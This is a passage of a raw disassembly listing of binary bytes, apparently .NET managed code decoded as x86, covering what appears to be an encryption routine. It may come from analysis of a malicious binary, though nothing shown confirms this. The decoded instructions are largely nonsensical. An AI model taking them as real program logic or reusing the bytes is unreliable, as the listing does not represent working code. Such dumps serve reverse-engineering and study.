  403b92:	00 70 6f             	add    %dh,0x6f(%eax)
  403b95:	4e                   	dec    %esi
  403b96:	00 00                	add    %al,(%eax)
  403b98:	0a 6f b9             	or     -0x47(%edi),%ch
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 28                	or     (%eax),%ch
  403b9f:	1f                   	pop    %ds
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	0a 13                	or     (%ebx),%dl
  403ba4:	09 11                	or     %edx,(%ecx)
  403ba6:	09 2c 17             	or     %ebp,(%edi,%edx,1)
  403ba9:	00 11                	add    %dl,(%ecx)
  403bab:	08 28                	or     %ch,(%eax)
  403bad:	47                   	inc    %edi
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	06                   	push   %es
  403bb1:	00 7e 20             	add    %bh,0x20(%esi)
  403bb4:	00 00                	add    %al,(%eax)
  403bb6:	04 11                	add    $0x11,%al
  403bb8:	08 6f c1             	or     %ch,-0x3f(%edi)
  403bbb:	00 00                	add    %al,(%eax)
  403bbd:	0a 26                	or     (%esi),%ah
  403bbf:	00 00                	add    %al,(%eax)
  403bc1:	12 07                	adc    (%edi),%al
  403bc3:	28 c2                	sub    %al,%dl
  403bc5:	00 00                	add    %al,(%eax)
  403bc7:	0a 2d a9 de 0f 12    	or     0x120fdea9,%ch
  403bcd:	07                   	pop    %es
  403bce:	fe                   	(bad)
  403bcf:	16                   	push   %ss
  403bd0:	04 00                	add    $0x0,%al
  403bd2:	00 1b                	add    %bl,(%ebx)
  403bd4:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd5:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403bda:	dc 2b                	fsubrl (%ebx)
  403bdc:	00 00                	add    %al,(%eax)
  403bde:	de 13                	ficoms (%ebx)
  403be0:	13 0a                	adc    (%edx),%ecx
  403be2:	00 11                	add    %dl,(%ecx)
  403be4:	0a 6f 75             	or     0x75(%edi),%ch
  403be7:	00 00                	add    %al,(%eax)
  403be9:	0a 28                	or     (%eax),%ch
  403beb:	49                   	dec    %ecx
  403bec:	00 00                	add    %al,(%eax)
  403bee:	06                   	push   %es
  403bef:	00 00                	add    %al,(%eax)
  403bf1:	de 00                	fiadds (%eax)
  403bf3:	2a 41 4c             	sub    0x4c(%ecx),%al
  403bf6:	00 00                	add    %al,(%eax)
  403bf8:	00 00                	add    %al,(%eax)
  403bfa:	00 00                	add    %al,(%eax)
  403bfc:	ab                   	stos   %eax,%es:(%edi)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	00 86 00 00 00 31    	add    %al,0x31000000(%esi)
  403c05:	01 00                	add    %eax,(%eax)
  403c07:	00 13                	add    %dl,(%ebx)
  403c09:	00 00                	add    %al,(%eax)
  403c0b:	00 12                	add    %dl,(%edx)
  403c0d:	00 00                	add    %al,(%eax)
  403c0f:	01 02                	add    %eax,(%edx)
  403c11:	00 00                	add    %al,(%eax)
  403c13:	00 8d 01 00 00 5b    	add    %cl,0x5b000001(%ebp)
  403c19:	00 00                	add    %al,(%eax)
  403c1b:	00 e8                	add    %ch,%al
  403c1d:	01 00                	add    %eax,(%eax)
  403c1f:	00 0f                	add    %cl,(%edi)
	...
  403c29:	00 00                	add    %al,(%eax)
  403c2b:	00 01                	add    %al,(%ecx)
  403c2d:	00 00                	add    %al,(%eax)
  403c2f:	00 fb                	add    %bh,%bl
  403c31:	01 00                	add    %eax,(%eax)
  403c33:	00 fc                	add    %bh,%ah
  403c35:	01 00                	add    %eax,(%eax)
  403c37:	00 13                	add    %dl,(%ebx)
  403c39:	00 00                	add    %al,(%eax)
  403c3b:	00 12                	add    %dl,(%edx)
  403c3d:	00 00                	add    %al,(%eax)
  403c3f:	01 13                	add    %edx,(%ebx)
  403c41:	30 0b                	xor    %cl,(%ebx)
  403c43:	00 1a                	add    %bl,(%edx)
  403c45:	01 00                	add    %eax,(%eax)
  403c47:	00 17                	add    %dl,(%edi)
  403c49:	00 00                	add    %al,(%eax)
  403c4b:	11 00                	adc    %eax,(%eax)
  403c4d:	28 c3                	sub    %al,%bl
  403c4f:	00 00                	add    %al,(%eax)
  403c51:	0a 02                	or     (%edx),%al
  403c53:	72 21                	jb     0x403c76
  403c55:	06                   	push   %es
  403c56:	00 70 6f             	add    %dh,0x6f(%eax)
  403c59:	4e                   	dec    %esi
  403c5a:	00 00                	add    %al,(%eax)
  403c5c:	0a 6f b9             	or     -0x47(%edi),%ch
  403c5f:	00 00                	add    %al,(%eax)
  403c61:	0a 28                	or     (%eax),%ch
  403c63:	42                   	inc    %edx
  403c64:	00 00                	add    %al,(%eax)
  403c66:	06                   	push   %es
  403c67:	28 c4                	sub    %al,%ah
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	0a 6f c5             	or     -0x3b(%edi),%ch
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 0a                	or     (%edx),%cl
  403c72:	06                   	push   %es
  403c73:	72 71                	jb     0x403ce6
  403c75:	06                   	push   %es
  403c76:	00 70 6f             	add    %dh,0x6f(%eax)
  403c79:	c6 00 00             	movb   $0x0,(%eax)
  403c7c:	0a 0b                	or     (%ebx),%cl
  403c7e:	07                   	pop    %es
  403c7f:	28 c7                	sub    %al,%bh
  403c81:	00 00                	add    %al,(%eax)
  403c83:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  403c86:	2d 00 00 04 2c       	sub    $0x2c040000,%eax
  403c8b:	05 38 85 00 00       	add    $0x8538,%eax
  403c90:	00 20                	add    %ah,(%eax)
  403c92:	00 01                	add    %al,(%ecx)
  403c94:	00 00                	add    %al,(%eax)
  403c96:	72 8d                	jb     0x403c25
  403c98:	06                   	push   %es
  403c99:	00 70 14             	add    %dh,0x14(%eax)
  403c9c:	d0 0e                	rorb   $1,(%esi)
  403c9e:	00 00                	add    %al,(%eax)
  403ca0:	02 28                	add    (%eax),%ch
  403ca2:	c8 00 00 0a          	enter  $0x0,$0xa
  403ca6:	1f                   	pop    %ds
  403ca7:	09 8d 84 00 00 01    	or     %ecx,0x1000084(%ebp)
  403cad:	25 16 16 14 28       	and    $0x28141616,%eax
  403cb2:	c9                   	leave
  403cb3:	00 00                	add    %al,(%eax)
  403cb5:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  403cbb:	28 c9                	sub    %cl,%cl
  403cbd:	00 00                	add    %al,(%eax)
  403cbf:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  403cc5:	28 c9                	sub    %cl,%cl
  403cc7:	00 00                	add    %al,(%eax)
  403cc9:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  403ccf:	28 c9                	sub    %cl,%cl
  403cd1:	00 00                	add    %al,(%eax)
  403cd3:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  403cd9:	28 c9                	sub    %cl,%cl
  403cdb:	00 00                	add    %al,(%eax)
  403cdd:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  403ce3:	28 c9                	sub    %cl,%cl
  403ce5:	00 00                	add    %al,(%eax)
  403ce7:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  403ced:	28 c9                	sub    %cl,%cl
  403cef:	00 00                	add    %al,(%eax)
  403cf1:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  403cf7:	28 c9                	sub    %cl,%cl
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  403d01:	28 c9                	sub    %cl,%cl
  403d03:	00 00                	add    %al,(%eax)
  403d05:	0a a2 28 ca 00 00    	or     0xca28(%edx),%ah
  403d0b:	0a 28                	or     (%eax),%ch
  403d0d:	cb                   	lret
  403d0e:	00 00                	add    %al,(%eax)
  403d10:	0a 80 2d 00 00 04    	or     0x400002d(%eax),%al
  403d16:	7e 2d                	jle    0x403d45
  403d18:	00 00                	add    %al,(%eax)
  403d1a:	04 7b                	add    $0x7b,%al
  403d1c:	cc                   	int3
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	0a 7e 2d             	or     0x2d(%esi),%bh
  403d22:	00 00                	add    %al,(%eax)
  403d24:	04 08                	add    $0x8,%al
  403d26:	28 06                	sub    %al,(%esi)
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	06                   	push   %es
  403d2b:	7e 0b                	jle    0x403d38
  403d2d:	00 00                	add    %al,(%eax)
  403d2f:	04 7e                	add    $0x7e,%al
  403d31:	10 00                	adc    %al,(%eax)
  403d33:	00 04 02             	add    %al,(%edx,%eax,1)
  403d36:	72 95                	jb     0x403ccd
  403d38:	06                   	push   %es
  403d39:	00 70 6f             	add    %dh,0x6f(%eax)
  403d3c:	4e                   	dec    %esi
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	0a 6f bd             	or     -0x43(%edi),%ch
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 7e 1e             	or     0x1e(%esi),%bh
  403d47:	00 00                	add    %al,(%eax)
  403d49:	04 7e                	add    $0x7e,%al
  403d4b:	08 00                	or     %al,(%eax)
  403d4d:	00 04 7e             	add    %al,(%esi,%edi,2)
  403d50:	0f 00 00             	sldt   (%eax)
  403d53:	04 7e                	add    $0x7e,%al
  403d55:	04 00                	add    $0x0,%al
  403d57:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403d5a:	cd 00                	int    $0x0
  403d5c:	00 0a                	add    %cl,(%edx)
  403d5e:	00 28                	add    %ch,(%eax)
  403d60:	48                   	dec    %eax
  403d61:	00 00                	add    %al,(%eax)
  403d63:	06                   	push   %es
  403d64:	00 2a                	add    %ch,(%edx)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	13 30                	adc    (%eax),%esi
  403d6a:	02 00                	add    (%eax),%al
  403d6c:	35 00 00 00 07       	xor    $0x7000000,%eax
  403d71:	00 00                	add    %al,(%eax)
  403d73:	11 00                	adc    %eax,(%eax)
  403d75:	73 4d                	jae    0x403dc4
  403d77:	00 00                	add    %al,(%eax)
  403d79:	0a 0a                	or     (%edx),%cl
  403d7b:	06                   	push   %es
  403d7c:	72 7b                	jb     0x403df9
  403d7e:	01 00                	add    %eax,(%eax)
  403d80:	70 6f                	jo     0x403df1
  403d82:	4e                   	dec    %esi
  403d83:	00 00                	add    %al,(%eax)
  403d85:	0a 72 a5             	or     -0x5b(%edx),%dh
  403d88:	06                   	push   %es
  403d89:	00 70 6f             	add    %dh,0x6f(%eax)
  403d8c:	4f                   	dec    %edi
  403d8d:	00 00                	add    %al,(%eax)
  403d8f:	0a 00                	or     (%eax),%al
  403d91:	06                   	push   %es
  403d92:	6f                   	outsl  %ds:(%esi),(%dx)
  403d93:	50                   	push   %eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	0a 28                	or     (%eax),%ch
  403d98:	20 00                	and    %al,(%eax)
  403d9a:	00 06                	add    %al,(%esi)
  403d9c:	00 20                	add    %ah,(%eax)
  403d9e:	e8 03 00 00 28       	call   0x28403da6
  403da3:	10 00                	adc    %al,(%eax)
  403da5:	00 0a                	add    %cl,(%edx)
  403da7:	00 2a                	add    %ch,(%edx)
  403da9:	00 00                	add    %al,(%eax)
  403dab:	00 13                	add    %dl,(%ebx)
  403dad:	30 02                	xor    %al,(%edx)
  403daf:	00 3c 00             	add    %bh,(%eax,%eax,1)
  403db2:	00 00                	add    %al,(%eax)
  403db4:	07                   	pop    %es
  403db5:	00 00                	add    %al,(%eax)
  403db7:	11 00                	adc    %eax,(%eax)
  403db9:	73 4d                	jae    0x403e08
  403dbb:	00 00                	add    %al,(%eax)
  403dbd:	0a 0a                	or     (%edx),%cl
  403dbf:	06                   	push   %es
  403dc0:	72 7b                	jb     0x403e3d
  403dc2:	01 00                	add    %eax,(%eax)
  403dc4:	70 6f                	jo     0x403e35
  403dc6:	4e                   	dec    %esi
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	0a 72 b7             	or     -0x49(%edx),%dh
  403dcc:	06                   	push   %es
  403dcd:	00 70 6f             	add    %dh,0x6f(%eax)
  403dd0:	4f                   	dec    %edi
  403dd1:	00 00                	add    %al,(%eax)
  403dd3:	0a 00                	or     (%eax),%al
  403dd5:	06                   	push   %es
  403dd6:	72 b7                	jb     0x403d8f
  403dd8:	06                   	push   %es
  403dd9:	00 70 6f             	add    %dh,0x6f(%eax)
  403ddc:	4e                   	dec    %esi
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	0a 02                	or     (%edx),%al
  403de1:	6f                   	outsl  %ds:(%esi),(%dx)
  403de2:	4f                   	dec    %edi
  403de3:	00 00                	add    %al,(%eax)
  403de5:	0a 00                	or     (%eax),%al
  403de7:	06                   	push   %es
  403de8:	6f                   	outsl  %ds:(%esi),(%dx)
  403de9:	50                   	push   %eax
  403dea:	00 00                	add    %al,(%eax)
  403dec:	0a 28                	or     (%eax),%ch
  403dee:	20 00                	and    %al,(%eax)
  403df0:	00 06                	add    %al,(%esi)
  403df2:	00 2a                	add    %ch,(%edx)
  403df4:	2e 73 ce             	jae,pn 0x403dc5
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  403dff:	2a 1b                	sub    (%ebx),%bl
  403e01:	30 03                	xor    %al,(%ebx)
  403e03:	00 5a 00             	add    %bl,0x0(%edx)
  403e06:	00 00                	add    %al,(%eax)
  403e08:	18 00                	sbb    %al,(%eax)
  403e0a:	00 11                	add    %dl,(%ecx)
  403e0c:	02 28                	add    (%eax),%ch
  403e0e:	14 00                	adc    $0x0,%al
  403e10:	00 0a                	add    %cl,(%edx)
  403e12:	00 00                	add    %al,(%eax)
  403e14:	03 28                	add    (%eax),%ebp
  403e16:	cf                   	iret
  403e17:	00 00                	add    %al,(%eax)
  403e19:	0a 0a                	or     (%edx),%cl
  403e1b:	06                   	push   %es
  403e1c:	2c 0b                	sub    $0xb,%al
  403e1e:	72 c3                	jb     0x403de3
  403e20:	06                   	push   %es
  403e21:	00 70 73             	add    %dh,0x73(%eax)
  403e24:	d0 00                	rolb   $1,(%eax)
  403e26:	00 0a                	add    %cl,(%edx)
  403e28:	7a 03                	jp     0x403e2d
  403e2a:	7e 27                	jle    0x403e53
  403e2c:	00 00                	add    %al,(%eax)
  403e2e:	04 20                	add    $0x20,%al
  403e30:	50                   	push   %eax
  403e31:	c3                   	ret
  403e32:	00 00                	add    %al,(%eax)
  403e34:	73 d1                	jae    0x403e07
  403e36:	00 00                	add    %al,(%eax)
  403e38:	0a 0b                	or     (%ebx),%cl
  403e3a:	00 02                	add    %al,(%edx)
  403e3c:	07                   	pop    %es
  403e3d:	1f                   	pop    %ds
  403e3e:	20 6f d2             	and    %ch,-0x2e(%edi)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	0a 7d 25             	or     0x25(%ebp),%bh
  403e46:	00 00                	add    %al,(%eax)
  403e48:	04 02                	add    $0x2,%al
  403e4a:	07                   	pop    %es
  403e4b:	1f                   	pop    %ds
  403e4c:	40                   	inc    %eax
  403e4d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e4e:	d2 00                	rolb   %cl,(%eax)
  403e50:	00 0a                	add    %cl,(%edx)
  403e52:	7d 26                	jge    0x403e7a
  403e54:	00 00                	add    %al,(%eax)
  403e56:	04 00                	add    $0x0,%al
  403e58:	de 0b                	fimuls (%ebx)
  403e5a:	07                   	pop    %es
  403e5b:	2c 07                	sub    $0x7,%al
  403e5d:	07                   	pop    %es
  403e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5f:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403e64:	dc 2a                	fsubrl (%edx)
  403e66:	00 00                	add    %al,(%eax)
  403e68:	01 10                	add    %edx,(%eax)
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	02 00                	add    (%eax),%al
  403e6e:	2e 00 20             	add    %ah,%cs:(%eax)
  403e71:	4e                   	dec    %esi
  403e72:	00 0b                	add    %cl,(%ebx)
  403e74:	00 00                	add    %al,(%eax)
  403e76:	00 00                	add    %al,(%eax)
  403e78:	13 30                	adc    (%eax),%esi
  403e7a:	03 00                	add    (%eax),%eax
  403e7c:	1c 00                	sbb    $0x0,%al
  403e7e:	00 00                	add    %al,(%eax)
  403e80:	0d 00 00 11 00       	or     $0x110000,%eax
  403e85:	02 28                	add    (%eax),%ch
  403e87:	17                   	pop    %ss
  403e88:	00 00                	add    %al,(%eax)
  403e8a:	0a 03                	or     (%ebx),%al
  403e8c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e8d:	18 00                	sbb    %al,(%eax)
  403e8f:	00 0a                	add    %cl,(%edx)
  403e91:	28 4d 00             	sub    %cl,0x0(%ebp)
  403e94:	00 06                	add    %al,(%esi)
  403e96:	28 d3                	sub    %dl,%bl
  403e98:	00 00                	add    %al,(%eax)
  403e9a:	0a 0a                	or     (%edx),%cl
  403e9c:	2b 00                	sub    (%eax),%eax
  403e9e:	06                   	push   %es
  403e9f:	2a 1b                	sub    (%ebx),%bl
  403ea1:	30 05 00 25 01 00    	xor    %al,0x12500
  403ea7:	00 19                	add    %bl,(%ecx)
  403ea9:	00 00                	add    %al,(%eax)
  403eab:	11 00                	adc    %eax,(%eax)
  403ead:	03 14 fe             	add    (%esi,%edi,8),%edx
  403eb0:	01 0a                	add    %ecx,(%edx)
  403eb2:	06                   	push   %es
  403eb3:	2c 0b                	sub    $0xb,%al
  403eb5:	72 0b                	jb     0x403ec2
  403eb7:	07                   	pop    %es
  403eb8:	00 70 73             	add    %dh,0x73(%eax)
  403ebb:	d4 00                	aam    $0x0
  403ebd:	00 0a                	add    %cl,(%edx)
  403ebf:	7a 73                	jp     0x403f34
  403ec1:	d5 00                	aad    $0x0
  403ec3:	00 0a                	add    %cl,(%edx)
  403ec5:	0b 00                	or     (%eax),%eax
  403ec7:	07                   	pop    %es
  403ec8:	1f                   	pop    %ds
  403ec9:	20 6a 6f             	and    %ch,0x6f(%edx)
  403ecc:	4a                   	dec    %edx
  403ecd:	00 00                	add    %al,(%eax)
  403ecf:	0a 00                	or     (%eax),%al
  403ed1:	73 d6                	jae    0x403ea9
  403ed3:	00 00                	add    %al,(%eax)
  403ed5:	0a 0c 00             	or     (%eax,%eax,1),%cl
  403ed8:	08 20                	or     %ah,(%eax)
  403eda:	00 01                	add    %al,(%ecx)
  403edc:	00 00                	add    %al,(%eax)
  403ede:	6f                   	outsl  %ds:(%esi),(%dx)
  403edf:	d7                   	xlat   %ds:(%ebx)
  403ee0:	00 00                	add    %al,(%eax)
  403ee2:	0a 00                	or     (%eax),%al
  403ee4:	08 20                	or     %ah,(%eax)
  403ee6:	80 00 00             	addb   $0x0,(%eax)
  403ee9:	00 6f d8             	add    %ch,-0x28(%edi)
  403eec:	00 00                	add    %al,(%eax)
  403eee:	0a 00                	or     (%eax),%al
  403ef0:	08 17                	or     %dl,(%edi)
  403ef2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef3:	d9 00                	flds   (%eax)
  403ef5:	00 0a                	add    %cl,(%edx)
  403ef7:	00 08                	add    %cl,(%eax)
  403ef9:	18 6f da             	sbb    %ch,-0x26(%edi)
  403efc:	00 00                	add    %al,(%eax)
  403efe:	0a 00                	or     (%eax),%al
  403f00:	08 02                	or     %al,(%edx)
  403f02:	7b 25                	jnp    0x403f29
  403f04:	00 00                	add    %al,(%eax)
  403f06:	04 6f                	add    $0x6f,%al
  403f08:	db 00                	fildl  (%eax)
  403f0a:	00 0a                	add    %cl,(%edx)
  403f0c:	00 08                	add    %cl,(%eax)
  403f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0f:	dc 00                	faddl  (%eax)
  403f11:	00 0a                	add    %cl,(%edx)
  403f13:	00 07                	add    %al,(%edi)
  403f15:	08 6f dd             	or     %ch,-0x23(%edi)
  403f18:	00 00                	add    %al,(%eax)
  403f1a:	0a 17                	or     (%edi),%dl
  403f1c:	73 de                	jae    0x403efc
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	0a 0d 00 07 08 6f    	or     0x6f080700,%cl
  403f26:	df 00                	filds  (%eax)
  403f28:	00 0a                	add    %cl,(%edx)
  403f2a:	16                   	push   %ss
  403f2b:	08 6f df             	or     %ch,-0x21(%edi)
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	0a 8e 69 6f 48 00    	or     0x486f69(%esi),%cl
  403f36:	00 0a                	add    %cl,(%edx)
  403f38:	00 09                	add    %cl,(%ecx)
  403f3a:	03 16                	add    (%esi),%edx
  403f3c:	03 8e 69 6f 48 00    	add    0x486f69(%esi),%ecx
  403f42:	00 0a                	add    %cl,(%edx)
  403f44:	00 09                	add    %cl,(%ecx)
  403f46:	6f                   	outsl  %ds:(%esi),(%dx)
  403f47:	e0 00                	loopne 0x403f49
  403f49:	00 0a                	add    %cl,(%edx)
  403f4b:	00 02                	add    %al,(%edx)
  403f4d:	7b 26                	jnp    0x403f75
  403f4f:	00 00                	add    %al,(%eax)
  403f51:	04 73                	add    $0x73,%al
  403f53:	e1 00                	loope  0x403f55
  403f55:	00 0a                	add    %cl,(%edx)
  403f57:	13 04 00             	adc    (%eax,%eax,1),%eax
  403f5a:	11 04 07             	adc    %eax,(%edi,%eax,1)
  403f5d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f5e:	e2 00                	loop   0x403f60
  403f60:	00 0a                	add    %cl,(%edx)
  403f62:	1f                   	pop    %ds
  403f63:	20 07                	and    %al,(%edi)
  403f65:	6f                   	outsl  %ds:(%esi),(%dx)
  403f66:	e2 00                	loop   0x403f68
  403f68:	00 0a                	add    %cl,(%edx)
  403f6a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  403f6d:	20 59 6f             	and    %bl,0x6f(%ecx)
  403f70:	e3 00                	jecxz  0x403f72
  403f72:	00 0a                	add    %cl,(%edx)
  403f74:	13 05 07 16 6a 6f    	adc    0x6f6a1607,%eax
  403f7a:	4a                   	dec    %edx
  403f7b:	00 00                	add    %al,(%eax)
  403f7d:	0a 00                	or     (%eax),%al
  403f7f:	07                   	pop    %es
  403f80:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  403f86:	69 6f 48 00 00 0a 00 	imul   $0xa0000,0x48(%edi),%ebp
  403f8d:	00 de                	add    %bl,%dh
  403f8f:	0d 11 04 2c 08       	or     $0x82c0411,%eax
  403f94:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403f97:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403f9c:	dc 00                	faddl  (%eax)
  403f9e:	de 0b                	fimuls (%ebx)
  403fa0:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  403fa3:	09 6f 2d             	or     %ebp,0x2d(%edi)
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	0a 00                	or     (%eax),%al
  403faa:	dc 00                	faddl  (%eax)
  403fac:	de 0b                	fimuls (%ebx)
  403fae:	08 2c 07             	or     %ch,(%edi,%eax,1)
  403fb1:	08 6f 2d             	or     %ch,0x2d(%edi)
  403fb4:	00 00                	add    %al,(%eax)
  403fb6:	0a 00                	or     (%eax),%al
  403fb8:	dc 07                	faddl  (%edi)
  403fba:	6f                   	outsl  %ds:(%esi),(%dx)
  403fbb:	e2 00                	loop   0x403fbd
  403fbd:	00 0a                	add    %cl,(%edx)
  403fbf:	13 06                	adc    (%esi),%eax
  403fc1:	de 0b                	fimuls (%ebx)
  403fc3:	07                   	pop    %es
  403fc4:	2c 07                	sub    $0x7,%al
  403fc6:	07                   	pop    %es
  403fc7:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc8:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  403fcd:	dc 11                	fcoml  (%ecx)
  403fcf:	06                   	push   %es
  403fd0:	2a 00                	sub    (%eax),%al
  403fd2:	00 00                	add    %al,(%eax)
  403fd4:	01 34 00             	add    %esi,(%eax,%eax,1)
  403fd7:	00 02                	add    %al,(%edx)
  403fd9:	00 ad 00 37 e4 00    	add    %ch,0xe43700(%ebp)
  403fdf:	0d 00 00 00 00       	or     $0x0,%eax
  403fe4:	02 00                	add    (%eax),%al
  403fe6:	76 00                	jbe    0x403fe8
  403fe8:	7e f4                	jle    0x403fde
  403fea:	00 0b                	add    %cl,(%ebx)
  403fec:	00 00                	add    %al,(%eax)
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	02 00                	add    (%eax),%al
  403ff2:	2b 00                	sub    (%eax),%eax
  403ff4:	d7                   	xlat   %ds:(%ebx)
  403ff5:	02 01                	add    (%ecx),%al
  403ff7:	0b 00                	or     (%eax),%eax
  403ff9:	00 00                	add    %al,(%eax)
  403ffb:	00 02                	add    %al,(%edx)
  403ffd:	00 1a                	add    %bl,(%edx)
  403fff:	00 fd                	add    %bh,%ch
  404001:	17                   	pop    %ss
  404002:	01 0b                	add    %ecx,(%ebx)
  404004:	00 00                	add    %al,(%eax)
  404006:	00 00                	add    %al,(%eax)
  404008:	13 30                	adc    (%eax),%esi
  40400a:	03 00                	add    (%eax),%eax
  40400c:	1c 00                	sbb    $0x0,%al
  40400e:	00 00                	add    %al,(%eax)
  404010:	0d 00 00 11 00       	or     $0x110000,%eax
  404015:	28 17                	sub    %dl,(%edi)
  404017:	00 00                	add    %al,(%eax)
  404019:	0a 02                	or     (%edx),%al
  40401b:	03 28                	add    (%eax),%ebp
  40401d:	1a 00                	sbb    (%eax),%al
  40401f:	00 0a                	add    %cl,(%edx)
  404021:	28 4f 00             	sub    %cl,0x0(%edi)
  404024:	00 06                	add    %al,(%esi)
  404026:	6f                   	outsl  %ds:(%esi),(%dx)
  404027:	e4 00                	in     $0x0,%al
  404029:	00 0a                	add    %cl,(%edx)
  40402b:	0a 2b                	or     (%ebx),%ch
  40402d:	00 06                	add    %al,(%esi)
  40402f:	2a 1b                	sub    (%ebx),%bl
  404031:	30 05 00 58 01 00    	xor    %al,0x15800
  404037:	00 1a                	add    %bl,(%edx)
  404039:	00 00                	add    %al,(%eax)
  40403b:	11 00                	adc    %eax,(%eax)
  40403d:	03 14 fe             	add    (%esi,%edi,8),%edx
  404040:	01 0a                	add    %ecx,(%edx)
  404042:	06                   	push   %es
  404043:	2c 0b                	sub    $0xb,%al
  404045:	72 0b                	jb     0x404052
  404047:	07                   	pop    %es
  404048:	00 70 73             	add    %dh,0x73(%eax)
  40404b:	d4 00                	aam    $0x0
  40404d:	00 0a                	add    %cl,(%edx)
  40404f:	7a 03                	jp     0x404054
  404051:	73 49                	jae    0x40409c
  404053:	00 00                	add    %al,(%eax)
  404055:	0a 0b                	or     (%ebx),%cl
  404057:	00 73 d6             	add    %dh,-0x2a(%ebx)
  40405a:	00 00                	add    %al,(%eax)
  40405c:	0a 0c 00             	or     (%eax,%eax,1),%cl
  40405f:	08 20                	or     %ah,(%eax)
  404061:	00 01                	add    %al,(%ecx)
  404063:	00 00                	add    %al,(%eax)
  404065:	6f                   	outsl  %ds:(%esi),(%dx)
  404066:	d7                   	xlat   %ds:(%ebx)
  404067:	00 00                	add    %al,(%eax)
  404069:	0a 00                	or     (%eax),%al
  40406b:	08 20                	or     %ah,(%eax)
  40406d:	80 00 00             	addb   $0x0,(%eax)
  404070:	00 6f d8             	add    %ch,-0x28(%edi)
  404073:	00 00                	add    %al,(%eax)
  404075:	0a 00                	or     (%eax),%al
  404077:	08 17                	or     %dl,(%edi)
  404079:	6f                   	outsl  %ds:(%esi),(%dx)
  40407a:	d9 00                	flds   (%eax)
  40407c:	00 0a                	add    %cl,(%edx)
  40407e:	00 08                	add    %cl,(%eax)
  404080:	18 6f da             	sbb    %ch,-0x26(%edi)
  404083:	00 00                	add    %al,(%eax)
  404085:	0a 00                	or     (%eax),%al
  404087:	08 02                	or     %al,(%edx)
  404089:	7b 25                	jnp    0x4040b0
  40408b:	00 00                	add    %al,(%eax)
  40408d:	04 6f                	add    $0x6f,%al
  40408f:	db 00                	fildl  (%eax)
  404091:	00 0a                	add    %cl,(%edx)
  404093:	00 02                	add    %al,(%edx)
  404095:	7b 26                	jnp    0x4040bd
  404097:	00 00                	add    %al,(%eax)
  404099:	04 73                	add    $0x73,%al
  40409b:	e1 00                	loope  0x40409d
  40409d:	00 0a                	add    %cl,(%edx)
  40409f:	13 04 00             	adc    (%eax,%eax,1),%eax
  4040a2:	11 04 07             	adc    %eax,(%edi,%eax,1)
  4040a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a6:	e2 00                	loop   0x4040a8
  4040a8:	00 0a                	add    %cl,(%edx)
  4040aa:	1f                   	pop    %ds
  4040ab:	20 07                	and    %al,(%edi)
  4040ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ae:	e2 00                	loop   0x4040b0
  4040b0:	00 0a                	add    %cl,(%edx)
  4040b2:	8e 69 1f             	mov    0x1f(%ecx),%gs
  4040b5:	20 59 6f             	and    %bl,0x6f(%ecx)
  4040b8:	e3 00                	jecxz  0x4040ba
  4040ba:	00 0a                	add    %cl,(%edx)
  4040bc:	13 05 1f 20 8d 59    	adc    0x598d201f,%eax
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	01 13                	add    %edx,(%ebx)
  4040c6:	06                   	push   %es
  4040c7:	07                   	pop    %es
  4040c8:	11 06                	adc    %eax,(%esi)
  4040ca:	16                   	push   %ss
  4040cb:	11 06                	adc    %eax,(%esi)
  4040cd:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4040d0:	41                   	inc    %ecx
  4040d1:	00 00                	add    %al,(%eax)
  4040d3:	0a 26                	or     (%esi),%ah
  4040d5:	02 11                	add    (%ecx),%dl
  4040d7:	05 11 06 28 50       	add    $0x50280611,%eax
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	06                   	push   %es
  4040df:	16                   	push   %ss
  4040e0:	fe 01                	incb   (%ecx)
  4040e2:	13 07                	adc    (%edi),%eax
